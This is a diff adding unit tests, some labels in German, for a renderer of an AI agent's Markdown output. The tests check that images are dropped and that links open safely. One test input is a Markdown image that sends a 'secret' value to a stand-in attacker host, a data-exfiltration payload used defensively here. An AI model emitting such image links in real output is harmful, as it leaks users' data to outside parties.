@@ -17,4 +17,17 @@ describe('agent Markdown', () => {
     expect(html).not.toContain('<script>')
     expect(html).not.toContain('href="javascript:')
   })
+
+  it('does not render images, which the browser would fetch without a click', () => {
+    const html = renderAgentMarkdown('![](https://angreifer.example/?d=geheim)')
+
+    expect(html).not.toContain('<img')
+  })
+
+  it('opens links in a new tab without opener, referrer or endorsement', () => {
+    const html = renderAgentMarkdown('[Spielplan](https://verein.example/spielplan) und https://verein.example')
+
+    expect(html).toContain('<a href="https://verein.example/spielplan" target="_blank" rel="noopener noreferrer nofollow">Spielplan</a>')
+    expect(html).toContain('<a href="https://verein.example" target="_blank" rel="noopener noreferrer nofollow">')
+  })
 })
